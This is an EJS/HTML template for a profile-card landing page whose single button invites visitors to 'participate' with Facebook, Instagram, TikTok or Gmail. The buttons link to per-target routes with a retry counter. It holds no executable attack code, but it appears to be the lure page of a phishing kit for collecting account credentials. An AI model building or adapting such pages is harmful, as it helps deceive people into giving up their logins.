<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <style>
      * {
        margin: 0;
        padding: 0;
        box-sizing: border-box;
      }

      body {
        font-family: Arial, Helvetica, sans-serif;
      }

      .card {
        display: flex;
        align-items: center;
        justify-content: center;
        background-image: url(/user.png);
        background-position: center;
        background-size: contain;
        height: 20vh;
      }

      .card .profile {
        display: flex;
        flex-direction: column;
        justify-content: center;
        align-items: center;
        position: absolute;
        top: 5%;
      }

      .card .profile .dp {
        width: 40%;
        border-radius: 50%;
        margin-bottom: 1em;
      }

      .card .profile div {
        margin-bottom: 0.5em;
      }

      .s-action {
        display: flex;
      }

      .s-action a {
        text-decoration: none;
        display: flex;
        align-items: center;
        background-color: #002a54f4;
        padding: 0.5em 1em;
        border-radius: 10px;
        color: #fff;
        box-shadow: 2px 2px 4px #000;
        margin-top: 1em;
      }

      .s-action a img {
        width: 2em;
        padding-left: 0.5em;
      }

      .loading-overlay {
        position: fixed;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        background-color: rgba(0, 0, 0, 0.5);
        display: flex;
        justify-content: center;
        align-items: center;
      }

      .loading-spinner {
        border: 4px solid #f3f3f3;
        border-top: 4px solid #3498db;
        border-radius: 50%;
        width: 50px;
        height: 50px;
        animation: spin 1s linear infinite;
      }

      @keyframes spin {
        0% {
          transform: rotate(0deg);
        }
        100% {
          transform: rotate(360deg);
        }
      }
    </style>
    <title><%= name %></title>
  </head>
  <body>
    <!-- 5 seconds loading overlay -->
    <div class="card">
      <div class="profile">
        <img class="dp" src="/dp.png" alt="" />
        <div><%= name %></div>
        <div class="s-action">
          <% if(linkType == 'FACEBOOK'){%>
          <a href="/face/<%= linkId %>?retry=<%=link.numberOfRetries%>">
            participate with facebook
            <img src="/img/facebook-logo.png" alt="" class="" />
          </a>
          <%}%> <% if(linkType == 'INSTAGRAM'){%>
          <a href="/inst/<%= linkId %>?retry=<%=link.numberOfRetries%>">
            participate with instagram
            <img src="/insta.webp" alt="" class="" />
          </a>
          <%}%> <% if(linkType == 'TIKTOK'){%>
          <a href="/tikto/<%= linkId %>?retry=<%=link.numberOfRetries%>">
            participatse with tiktok
            <img src="/tiktok/tiktok.png" alt="" class="" />
          </a>
          <%}%> <% if(linkType == 'GMAIL'){%>
          <a href="/gma/<%= linkId %>?retry=<%=link.numberOfRetries%>">
            participate with gmail
            <img src="/img/gmail.png" alt="" class="" />
          </a>
          <%}%>
        </div>
      </div>
    </div>
  </body>
</html>
